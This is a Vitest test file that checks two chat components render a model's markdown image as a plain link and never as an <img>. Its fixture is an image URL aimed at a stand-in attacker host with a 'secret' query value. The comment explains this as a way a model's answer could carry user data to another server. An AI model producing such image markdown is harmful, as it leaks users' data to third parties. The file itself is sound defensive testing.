import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { expect, it } from "vitest";
import { MarkdownAnswer } from "@/client/features/ai-search/components/MarkdownAnswer";
import { Markdown } from "./Markdown";

const IMAGE = "![chart](https://evil.example/px.png?d=secret)";

// An <img> loads the moment it renders, so a model's answer must never
// produce one: its address could carry the user's data to another server.
it.each([
  ["SAM chat", createElement(Markdown, null, IMAGE)],
  ["Prompt Explorer", createElement(MarkdownAnswer, { text: IMAGE })],
])("%s shows a model's image as a link", (_surface, element) => {
  const html = renderToStaticMarkup(element);
  expect(html).not.toContain("<img");
  expect(html).toContain('href="https://evil.example/px.png?d=secret"');
});
